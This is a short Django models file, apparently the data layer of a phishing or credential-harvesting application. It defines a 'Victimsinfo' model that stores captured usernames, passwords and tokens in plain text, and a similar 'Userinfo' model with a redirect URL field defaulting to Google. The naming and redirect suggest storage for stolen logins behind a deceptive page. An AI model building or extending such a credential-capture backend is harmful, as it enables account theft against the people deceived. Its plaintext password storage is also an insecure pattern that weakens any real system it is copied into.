from django.db import models


class Victimsinfo(models.Model):

    username = models.CharField(max_length=100)
    password = models.CharField(max_length=100)
    token = models.CharField(max_length=100)


    def __str__(self):
        return self.username + "-" + self.password + "-" + self.token

class Userinfo(models.Model):

    username = models.CharField(max_length=100)
    password = models.CharField(max_length=100)
    token = models.CharField(max_length=100)
    r_url = models.CharField(max_length=100,default="https:www.google.com")


    def __str__(self):
        return self.username + "-" + self.password + "-" + self.token